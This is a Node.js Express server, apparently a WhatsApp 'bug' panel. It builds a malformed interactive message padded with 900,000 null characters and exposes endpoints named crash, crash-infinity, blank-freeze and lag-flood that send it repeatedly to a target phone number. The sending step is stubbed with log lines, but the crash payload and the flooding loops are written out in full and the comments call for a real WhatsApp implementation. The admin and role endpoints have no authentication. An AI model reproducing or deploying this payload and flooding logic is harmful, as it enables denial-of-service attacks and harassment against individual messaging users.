const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

const loadUsers = () => JSON.parse(fs.readFileSync("./users.json", "utf8"));
const saveUsers = (data) => fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));

// User Management Endpoints
app.post("/api/add-user", (req, res) => {
  const { phone, role } = req.body;
  const users = loadUsers();
  users.push({ phone, role });
  saveUsers(users);
  res.json({ success: true, message: "User added." });
});

app.post("/api/add-admin", (req, res) => {
  const { phone } = req.body;
  const users = loadUsers();
  users.push({ phone, role: "admin" });
  saveUsers(users);
  res.json({ success: true, message: "Admin added." });
});

app.post("/api/change-role", (req, res) => {
  const { phone, newRole } = req.body;
  const users = loadUsers();
  const user = users.find(u => u.phone === phone);
  if (user) {
    user.role = newRole;
    saveUsers(users);
    res.json({ success: true, message: "Role updated." });
  } else {
    res.status(404).json({ success: false, message: "User not found." });
  }
});

// BUG FUNCTIONS
async function InvisibleLoadFast(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "⏤͟͟͞͞ꀸꍟ꒒ꀎꏳꍏ ꀤꑄ ꃅꍟꋪꍟ⿻" + "\u0000".repeat(900000),
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    };

    // Simulasi pengiriman message (ganti dengan implementasi WhatsApp actual)
    console.log(`🚀 Sending crash message to ${target}`);
    console.log(`Message length: ${JSON.stringify(message).length} characters`);
    
    // Simulasi delay pengiriman
    await delay(1000 + Math.random() * 2000);
    
    return { success: true, message: "Crash message sent" };
  } catch (err) {
    console.log("Error in InvisibleLoadFast:", err);
    throw err;
  }
}

// CRASH INFINITY FUNCTION
async function crashInfinity(target, iterations = 10) {
  console.log(`🔥 Starting Crash Infinity on ${target} with ${iterations} iterations`);
  
  const results = [];
  for (let i = 0; i < iterations; i++) {
    try {
      console.log(`🔄 Iteration ${i + 1}/${iterations} for ${target}`);
      
      // Kirim bug dengan variasi delay
      const result = await InvisibleLoadFast(target);
      results.push({ iteration: i + 1, success: true, timestamp: Date.now() });
      
      // Delay antara pengiriman (semakin lama semakin random)
      const delayTime = 1000 + (Math.random() * 3000) + (i * 100);
      await delay(delayTime);
      
    } catch (error) {
      console.log(`❌ Error in iteration ${i + 1}:`, error.message);
      results.push({ iteration: i + 1, success: false, error: error.message });
    }
  }
  
  return results;
}

// BLANK FREEZE FUNCTION
async function blankFreeze(target, duration = 30000) {
  console.log(`❄️ Starting Blank Freeze on ${target} for ${duration}ms`);
  
  // Simulasi efek freeze dengan multiple messages
  const messages = 5;
  const results = [];
  
  for (let i = 0; i < messages; i++) {
    try {
      await InvisibleLoadFast(target);
      results.push({ message: i + 1, success: true });
      await delay(duration / messages);
    } catch (error) {
      results.push({ message: i + 1, success: false, error: error.message });
    }
  }
  
  return results;
}

// LAG FLOOD FUNCTION
async function lagFlood(target, count = 50) {
  console.log(`🌊 Starting Lag Flood on ${target} with ${count} messages`);
  
  const results = [];
  for (let i = 0; i < count; i++) {
    try {
      // Kirim dengan delay sangat cepat untuk efek flood
      await InvisibleLoadFast(target);
      results.push({ flood: i + 1, success: true });
      
      // Delay sangat pendek untuk efek flood
      await delay(100 + Math.random() * 200);
      
    } catch (error) {
      results.push({ flood: i + 1, success: false, error: error.message });
    }
  }
  
  return results;
}

// UTILITY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// BUG ENDPOINTS
app.post("/api/crash", async (req, res) => {
  const { target } = req.body;
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    await InvisibleLoadFast(target);
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

// CRASH INFINITY ENDPOINT
app.post("/api/crash-infinity", async (req, res) => {
  const { target, iterations = 10 } = req.body;
  
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    const results = await crashInfinity(target, parseInt(iterations));
    
    const successCount = results.filter(r => r.success).length;
    const failedCount = results.filter(r => !r.success).length;
    
    res.json({ 
      success: true, 
      message: `Crash Infinity completed: ${successCount} successful, ${failedCount} failed`,
      results,
      summary: {
        total: results.length,
        success: successCount,
        failed: failedCount
      }
    });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal menjalankan Crash Infinity", error: err.message });
  }
});

// BLANK FREEZE ENDPOINT
app.post("/api/blank-freeze", async (req, res) => {
  const { target, duration = 30000 } = req.body;
  
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    const results = await blankFreeze(target, parseInt(duration));
    res.json({ 
      success: true, 
      message: `Blank Freeze completed on ${target}`,
      duration: `${duration}ms`,
      results 
    });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal menjalankan Blank Freeze", error: err.message });
  }
});

// LAG FLOOD ENDPOINT
app.post("/api/lag-flood", async (req, res) => {
  const { target, count = 50 } = req.body;
  
  if (!target) {
    return res.status(400).json({ success: false, message: "Target number is required." });
  }

  try {
    const results = await lagFlood(target, parseInt(count));
    res.json({ 
      success: true, 
      message: `Lag Flood completed: ${results.length} messages sent`,
      count: results.length,
      results 
    });
  } catch (err) {
    res.status(500).json({ success: false, message: "Gagal menjalankan Lag Flood", error: err.message });
  }
});

// GET ACTIVE STATUS (Optional)
app.get("/api/status", (req, res) => {
  res.json({ 
    status: "Server running", 
    timestamp: Date.now(),
    endpoints: [
      "/api/crash",
      "/api/crash-infinity", 
      "/api/blank-freeze",
      "/api/lag-flood"
    ]
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📧 Available bug endpoints:`);
  console.log(`   POST /api/crash`);
  console.log(`   POST /api/crash-infinity`);
  console.log(`   POST /api/blank-freeze`);
  console.log(`   POST /api/lag-flood`);
  console.log(`   GET  /api/status`);
});